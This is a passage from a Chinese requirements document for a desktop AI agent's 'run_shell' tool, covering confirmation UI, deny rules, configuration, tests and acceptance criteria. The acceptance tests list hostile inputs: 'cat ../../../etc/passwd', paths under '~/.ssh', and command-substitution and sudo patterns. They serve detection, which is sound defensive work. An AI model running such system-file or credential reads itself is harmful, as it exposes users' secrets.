│ │ npm run deploy                          │ │
│ └─────────────────────────────────────────┘ │
│ 工作目录：E:\Projects\my-app                 │
│    [✓ 我了解风险，确认执行]    [✗ 拒绝]      │
└─────────────────────────────────────────────┘
```

**§7.2 硬 deny（注入/提权等）— rejected 态，无确认按钮：**

```
┌─────────────────────────────────────────────┐
│ 💻 run_shell                      ✗ rejected │
│ 检测到命令替换（$() 或反引号），已拒绝执行    │
└─────────────────────────────────────────────┘
```

**UI 实现要求：**

| 项 | 要求 |
|----|------|
| 路径/敏感/越界/cd/symlink/外溢警示 | 统一 **`Alert type="warning"`**，全宽、命令正文**上方** |
| 确认按钮 | `requiresRiskAck === true` → **「我了解风险，确认执行」**；否则 **「确认执行」** |
| 硬 deny | rejected 态文案，**不** 使用可执行确认按钮 |
| 数据 source | `tool:confirm-request.shellSecurityHints` |

- 使用等宽字体展示 `command`
- 不提供「编辑后执行」（避免 TOCTOU；若需改命令用户应让 Agent 重新生成）

**`outsideWorkDirRisk` 启发式（MVP，可扩展）：**

| 模式 | 判定 |
|------|------|
| 无路径字面量且命令为 `npm run *` / `pnpm *` / `yarn *` / `npx *`（非 install） | `outsideWorkDirRisk: true` |
| `node` / `python` 跟随 workDir 外字面量脚本路径 | ask + `requiresRiskAck` |
| 仅 `git status` / `npm install` / `node -v` 等 | `false` |

### 9.3 执行中与结果

| 状态 | 展示 |
|------|------|
| executing | 终端风格滚动输出（stdout 优先；stderr 红色） |
| completed | 退出码 + 可折叠完整输出 |
| failed | 错误摘要 + stderr |
| rejected / 安全拒绝 | 灰色/红色说明，不展示输出 |

**工具标签（`toolCallDisplay.ts`）：**

- 标题：`运行命令`
- 副标题：`command` 截断至 80 字符

### 9.4 Phase 2 体验增强（参考 bash-tool-analysis §2.4）

| 编号 | 能力 | 阈值 |
|------|------|------|
| UX-01 | 长命令自动后台化 | 前台 **15s** 无退出 → 转后台 |
| UX-02 | 进度提示 | **2s** 后显示「仍在运行…」 |
| UX-03 | 只读命令折叠 | `git status`、`ls` 等匹配规则时默认折叠详情 |
| UX-04 | 静默命令 | 退出 0 且无输出 → 标记「已完成（无输出）」 |

---

## 10. 配置与数据模型

### 10.1 ShellConfig

在 `AppConfig` 中扩展（推荐独立字段，便于迁移）：

```typescript
interface ShellConfig {
  /** 与 deniedTools 联动；此处可冗余 enabled 便于设置页绑定 */
  enabled: boolean
  shellDefaultTimeoutSec: number   // 默认 300
  /** 高级：自定义 shell 可执行文件路径 */
  executable?: string
  /** Phase 2 */
  rules?: ShellRule[]
  maxInlineOutputBytes?: number    // 默认 102400
}

const DEFAULT_SHELL_CONFIG: ShellConfig = {
  enabled: false,
  shellDefaultTimeoutSec: 300,
  maxInlineOutputBytes: 102400
}
```

**与 `ToolsConfig` 关系：**

- `shell.enabled === false` ⟹ 自动将 `run_shell` 加入 `deniedTools`
- 用户仅通过设置页 Switch 改变 enabled，避免状态不一致

### 10.2 数据库

`configs` 表新增键 `shell`，JSON 存储 `ShellConfig`；读取时 merge 默认值。

### 10.3 消息持久化

复用现有 `ToolCallRecord`；`input.command` 完整持久化（用户已在确认时审阅）。`result.data` 中大输出可仅存截断版 + `persistedOutputPath`。

---

## 11. 主进程实现要点

### 11.1 模块划分

| 模块 | 路径建议 | 职责 |
|------|---------|------|
| `runShellExecutor` | `electron/tools/runShellExecutor.ts` | ToolExecutor 实现 |
| `shellSecurity` | `electron/shell/shellSecurity.ts` | 静态验证器链（注入、重定向、提权等） |
| `shellCommandParser` | `electron/shell/shellCommandParser.ts` | 复合命令分段 |
| `shellPathAnalysis` | `electron/shell/shellPathAnalysis.ts` | 路径字面量提取、workDir 校验、cd 限制 |
| `shellSensitivePaths` | `electron/shell/shellSensitivePaths.ts` | 内置敏感路径警示前缀 |
| `shellPermissions` | `electron/shell/shellPermissions.ts` | Phase 2 规则匹配 |
| `buildShellEnv` | `electron/processOutputEncoding.ts` | 环境变量净化 |

### 11.2 注册

```typescript
// builtinExecutors.ts registry
[runShellExecutor.name, runShellExecutor]

// builtinToolDefinitions.ts
// filterBuiltinToolsForRenderer：shell.enabled / deniedTools
```

### 11.3 取消与超时

- 超时：`setTimeout` + `killProcessTree(proc)`（与 `run_script` 一致，Windows 用 taskkill）
- 取消：用户 `tool:cancel` → `AbortSignal` → killProcessTree
- 合成 signal：复用 `combineUserAbortAndTimeout`

### 11.4 测试要求

| 测试文件 | 覆盖 |
|---------|------|
| `shellSecurity.test.ts` | 命令替换、重定向、多行、sudo、lark-cli |
| `shellCommandParser.test.ts` | `&&`、`\|`、引号内分段 |
| `shellPathAnalysis.test.ts` | 越界/敏感/cd/symlink → ask + `requiresRiskAck`；§7.2 注入类 → deny |
| `runShellExecutor.test.ts` | mock spawn；超时；输出截断；§7.2 deny 不 spawn |
| `toolInputGuards.test.ts` | 补充 `run_shell` 分支 |

---

## 12. 与现有工具的关系

| 工具 | 关系 |
|------|------|
| `run_script` | Python 代码片段；**保留**。数值计算、短脚本优先 Python；CLI 工具链用 `run_shell` |
| `run_lark_cli` | 飞书专用；**禁止** shell 绕过 |
| `grep` | 搜索优先 `grep`；`run_shell` 不应成为默认搜索手段 |
| `read_file` / `write_file` | 文件读写优先专用工具；**硬路径沙箱**。避免 `cat`/`echo >`；workDir 外读文件应用 `read_file`（若允许）而非 shell |
| `browser_detect` | 安装引导可复制命令；启用 `run_shell` 后 Agent 可代为执行 `npx playwright install chromium` |

**模型提示（system / skill）：**

> 在工作目录执行 npm、git、构建命令时使用 `run_shell`；运行 Python 代码使用 `run_script`；操作飞书使用 `run_lark_cli`。

---

## 13. 非功能需求

### 13.1 性能

| 指标 | 要求 |
|------|------|
| 静态分析耗时 | < 10ms（8192 字符以内） |
| 进程启动 | < 500ms（不含命令本身） |
| 确认 IPC 往返 | < 100ms |

### 13.2 安全

- 默认关闭；确认不可全局禁用（MVP）
- 拒绝比放行更安全；解析异常 → 拒绝或 ask
- §7.2 硬 deny（注入/提权/重定向等）→ 必须拒绝，不 spawn
- 路径越界 / 敏感 / 非法 cd → **warning 确认**，`requiresRiskAck` + 审计；**不得**无警示静默执行
- 日志脱敏：不写 API Key；命令中的 token 按 `sanitizeForLog` 处理

### 13.3 兼容性

- 配置迁移：旧用户 `deniedTools` 无 `run_shell` 时，**不自动启用**；仅当用户打开 Switch 才从 denied 移除
- 跨平台 CI：主进程测试在 node 环境跑；Windows 特有 kill 逻辑沿用 `spawnUtil` 单测

---

## 14. 验收标准

### 14.1 MVP（Phase 1）

- [ ] 默认配置下模型**看不到** `run_shell` 工具定义
- [ ] 设置页开启后，Agent 可调用 `run_shell` 且**必须**经确认才执行
- [ ] 在 workDir 下成功执行 `node -v` / `npm -v`（环境允许时）并返回 stdout
- [ ] 含 `$()`、`` ` ``、`>`、`sudo`、换行的命令被 **硬 deny** 且不 spawn
- [ ] `cat ../../../etc/passwd`、`cd .. && dir`、workDir 外绝对路径、命中 `~/.ssh` → **确认卡片**顶部 **warning Alert** + 按钮「我了解风险，确认执行」
- [ ] `cd src/sub`（workDir 内）无 cd 警示；可无 `requiresRiskAck`（仍须普通确认）
- [ ] 用户点击风险确认后写入 `shell.path.confirm` 审计（含 `violationCodes`）
- [ ] P1：symlink 指向 workDir 外 → ask + warning，同 UX
- [ ] 超时与用户取消能终止进程树，返回 `interrupted: true`
- [ ] stdout/stderr 超 100KB 截断并标记
- [ ] 工具调用记录写入消息历史并可回显
- [ ] Windows / macOS 至少各手动验证 1 条成功路径

### 14.2 Phase 2

- [ ] allow/deny/ask 规则在设置页可配置且生效
- [ ] 大输出落盘并可从 UI 打开路径

---

## 15. 发布阶段建议

### Phase 1 — MVP（P0）

- `run_shell` 工具定义 + 执行器 + 静态安全
- **`shellPathAnalysis` + 敏感路径警示 + cd 限制**（§7.3～§7.8）
- 确认卡片 **Alert 警示** + `shellSecurityHints` IPC + **路径相关审计**
- 默认 denied + 设置页 Switch / 超时（含 §1.4 能力边界说明）
- 流式输出 + 取消/超时
- 单元测试 + 文档更新

### Phase 2 — 策略与体验（P1）

- Shell 规则 UI + `shellPermissions`
- 大输出持久化
- Shell 路径审计查询 UI（可选）

> **说明：** §7.8 路径 confirm 审计在 **Phase 1** 即要求落地；Phase 2 扩展为更完整的查询与规则 UI。

### Phase 3 — 可选增强（P2）

- 自定义 shell（Git Bash）
- 退出码语义库
- 与 Skills 联动（如「仅在 package.json 存在时建议 npm install」）

---

## 16. 待解决问题

| # | 问题 | 优先级 | 备注 |
|---|------|--------|------|
| OQ-1 | Windows 默认 `cmd` vs PowerShell？ | 高 | MVP 建议 cmd `/c`；PowerShell 引号规则更复杂 |
| OQ-2 | 是否允许 `\|` 管道？ | 高 | 建议 MVP 允许，但整句确认；静态 deny 危险组合 |
| OQ-3 | `git commit` 是否允许？ | 中 | 写操作风险高；MVP 可允许但强制确认；Phase 2 默认 deny |
| OQ-4 | 飞书远程 Agent 是否开放 `run_shell`？ | 高 | 建议默认 **禁止** 远程会话使用，与 `browser` 远程策略类似 |
| OQ-5 | 是否与 `run_script` 合并为统一 `run_command`？ | 低 | 暂不合并，避免 Python 与 shell 安全模型混淆 |
| OQ-6 | 启用时是否强制二次确认（对话框）？ | 中 | 产品决策：Switch + Alert 即可，或首次启用 Modal |

---

**文档版本：** v1.2  
**适用范围：** SpaceAssistant 桌面应用 Agent 系统命令执行能力  
**维护者：** 与 [tools-requirement.md](./tools-requirement.md) 同步演进
